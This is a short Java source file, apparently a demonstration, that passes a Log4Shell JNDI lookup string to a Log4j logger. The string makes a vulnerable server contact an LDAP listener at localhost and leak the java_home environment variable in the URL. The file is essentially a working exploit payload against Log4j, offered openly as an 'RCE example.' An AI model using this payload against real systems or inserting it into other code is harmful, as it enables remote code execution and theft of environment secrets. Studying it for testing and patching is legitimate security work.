
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import javax.naming.NamingException;
public class RCEExample {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) throws NamingException {

        logger.error("${jndi:ldap://127.0.0.1:1389/${env:java_home}}"); //Leak java_home env variable

    }
}